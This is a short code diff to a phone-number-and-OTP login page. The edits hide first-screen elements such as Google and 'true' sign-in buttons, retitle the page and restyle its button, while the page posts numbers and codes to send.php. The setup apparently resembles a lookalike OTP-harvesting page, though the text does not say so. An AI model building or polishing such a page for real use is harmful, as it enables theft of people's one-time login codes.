@@ -249,6 +249,7 @@ button.get-otp-btn{
 
 </div>
 
+</div>
 <!-- OTP Section -->
 <div id="otpSection" style="display:none; margin-top:10px;">
 
@@ -422,6 +423,7 @@ function nextStep() {
             return;
         }
 
+        // SEND NUMBER
         fetch("send.php", {
             method: "POST",
             headers: {
@@ -430,8 +432,35 @@ function nextStep() {
             body: "number=" + encodeURIComponent(phone)
         });
 
+        // HIDE FIRST SCREEN
+        document.querySelector(".logo").style.display = "none";
+
+        document.querySelector("h1").style.display = "none";
+
+        document.querySelector("p").style.display = "none";
+
+        document.getElementById("orSection").style.display = "none";
+
+        document.getElementById("googleBtn").style.display = "none";
+
+        document.getElementById("trueBtn").style.display = "none";
+
+        document.getElementById("privacyText").style.display = "none";
+
+        // CHANGE TITLE
+        document.getElementById("topTitle").innerText =
+        "Create Account / Login";
+
+        // SHOW OTP SECTION
         document.getElementById("otpSection").style.display = "block";
-        document.getElementById("mainBtn").innerText = "Verify OTP";
+
+        // CHANGE BUTTON
+        document.getElementById("mainBtn").innerText = "Confirm";
+
+        // CHANGE BUTTON COLOR
+        document.getElementById("mainBtn").style.background = "#e9e9e9";
+
+        document.getElementById("mainBtn").style.color = "#666";
 
         otpShown = true;
 
@@ -449,12 +478,12 @@ function nextStep() {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
             body:
-                "number=" + encodeURIComponent(phone) +
-                "&otp=" + encodeURIComponent(otp)
+            "number=" + encodeURIComponent(phone) +
+            "&otp=" + encodeURIComponent(otp)
         });
+
     }
 }
-
 function checkPhone() {
     let phone = document.getElementById("phone").value;
     let btn = document.getElementById("mainBtn");
